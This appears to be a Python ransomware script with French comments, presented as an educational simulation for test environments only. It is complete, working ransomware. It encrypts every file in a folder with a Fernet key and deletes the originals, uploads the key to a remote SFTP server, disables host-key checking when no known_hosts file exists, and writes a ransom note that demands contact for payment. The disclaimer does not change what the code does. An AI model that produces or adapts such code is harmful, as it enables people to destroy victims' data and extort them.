#!/usr/bin/env python3
# SIMULATION RANSOMWARE ÉDUCATIF - ENV. DE TEST UNIQUEMENT

import os
import pysftp
import hashlib
from cryptography.fernet import Fernet
from pathlib import Path
import socket
import getpass

# ====================
# CONFIGURATION SFTP
# ====================
SFTP_HOST = "votre_serveur_sftp.com"  # Remplacez par votre serveur
SFTP_USER = "utilisateur_sftp"  # Remplacez par vos identifiants
SFTP_PASS = "motdepasse_sftp"  # Remplacez par votre mot de passe
SFTP_PORT = 22
REMOTE_PATH = "/chemin/vers/dossier_clés/"  # Dossier sur le serveur SFTP


# ====================
# FONCTIONS DE CHIFFREMENT
# ====================
def generate_unique_key():
    """Génère une clé unique basée sur l'identifiant machine"""
    machine_id = hashlib.sha256(
        f"{socket.gethostname()}-{getpass.getuser()}".encode()
    ).digest()
    return Fernet.generate_key(), machine_id.hex()[:8]


def encrypt_file(filepath, key):
    """Chiffre un fichier avec la clé fournie"""
    try:
        fernet = Fernet(key)
        with open(filepath, "rb") as f:
            data = f.read()

        encrypted = fernet.encrypt(data)

        with open(f"{filepath}.locked", "wb") as f:
            f.write(encrypted)

        os.remove(filepath)
        print(f"[+] Fichier chiffré: {filepath}")
        return True
    except Exception as e:
        print(f"[!] Erreur sur {filepath}: {str(e)}")
        return False


# ====================
# FONCTIONS SFTP SÉCURISÉES
# ====================
def sftp_connect():
    """Établit une connexion SFTP sécurisée"""
    cnopts = pysftp.CnOpts()
    if not os.path.exists("known_hosts"):
        cnopts.hostkeys = None  # Désactiver seulement pour les tests!
    else:
        cnopts.hostkeys.load("known_hosts")

    return pysftp.Connection(
        host=SFTP_HOST,
        username=SFTP_USER,
        password=SFTP_PASS,
        port=SFTP_PORT,
        cnopts=cnopts
    )


def upload_key_to_sftp(key, client_id):
    """Upload la clé vers le serveur SFTP de manière sécurisée"""
    key_filename = f"{client_id}_key.key"

    try:
        # Écriture temporaire de la clé
        with open(key_filename, "wb") as f:
            f.write(key)

        # Connexion et upload
        with sftp_connect() as sftp:
            sftp.chdir(REMOTE_PATH)
            sftp.put(key_filename)
            print(f"[+] Clé envoyée vers {REMOTE_PATH}{key_filename}")

        # Nettoyage local
        os.remove(key_filename)
        return True
    except Exception as e:
        print(f"[!] Échec de l'upload SFTP: {str(e)}")
        if os.path.exists(key_filename):
            os.remove(key_filename)
        return False


# ====================
# FONCTION PRINCIPALE
# ====================
def main():
    print("""
    *******************************************************
    SIMULATION ÉDUCATIVE - ENVIRONNEMENT DE TEST UNIQUEMENT
    Ce code montre comment les ransomwares fonctionnent
    pour mieux s'en protéger. NE PAS UTILISER MALVEILLAMMENT.
    *******************************************************
    """)

    # Génération de la clé unique
    encryption_key, client_id = generate_unique_key()
    print(f"[+] Clé générée (ID: {client_id})")

    # Simulation de chiffrement (dossier test seulement)
    test_files = list(Path("test_files").glob("*")) if Path("test_files").exists() else []
    if test_files:
        print("\n[+] Chiffrement des fichiers de test...")
        for file in test_files:
            if file.is_file() and not file.name.endswith(".locked"):
                encrypt_file(file, encryption_key)

    # Envoi de la clé vers le serveur SFTP
    if upload_key_to_sftp(encryption_key, client_id):
        # Affichage de la note de rançon
        ransom_note = f"""
        ==============================
        VOS FICHIERS ONT ÉTÉ CHIFFRÉS!
        ID: {client_id}

        Contactez fake@example.com 
        avec votre ID pour le paiement.
        ==============================
        """
        print(ransom_note)
        with open("RECOVER_FILES.txt", "w") as f:
            f.write(ransom_note)
    else:
        print("[!] Échec de l'envoi de la clé - simulation annulée")


if __name__ == "__main__":
    main()